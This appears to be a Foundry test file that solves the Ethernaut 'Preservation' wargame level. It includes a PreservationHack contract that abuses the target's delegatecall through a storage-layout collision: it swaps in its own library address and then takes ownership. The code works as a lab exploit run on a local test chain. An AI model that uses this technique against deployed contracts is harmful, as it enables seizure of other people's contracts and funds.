// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/Preservation/Preservation.sol";
import "../src/Preservation/PreservationFactory.sol";
import "../src/Ethernaut.sol";

contract PreservationTest is Test {
    Ethernaut private _ethernaut;
    PreservationFactory private _preservationFactory;
    Preservation private _preservation;

    address private _hacker = address(0xA);

    modifier testWrapper() {
        vm.deal(_hacker, 1 ether);
        _ethernaut.registerLevel(_preservationFactory);
        vm.startPrank(_hacker);
        address instance = _ethernaut.createLevelInstance(_preservationFactory);
        _preservation = Preservation(instance);
        _;
        bool success = _ethernaut.submitLevelInstance(
            payable(address(_preservation))
        );
        assertTrue(success);
        vm.stopPrank();
    }

    function setUp() public {
        _ethernaut = new Ethernaut();
        _preservationFactory = new PreservationFactory();
    }

    function testPreservationHack() public testWrapper {
        PreservationHack preservationHack = new PreservationHack(
            address(_preservation)
        );

        preservationHack.attack();

        _preservation.setFirstTime(uint160(_hacker));
    }
}

contract PreservationHack {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    address public challengeAddress;

    constructor(address _challengeAddress) {
        challengeAddress = _challengeAddress;
    }

    function setTime(uint _owner) public {
        owner = address(uint160(_owner));
    }

    function attack() public {
        Preservation(challengeAddress).setFirstTime(
            uint256(uint160(address(this)))
        );
    }
}
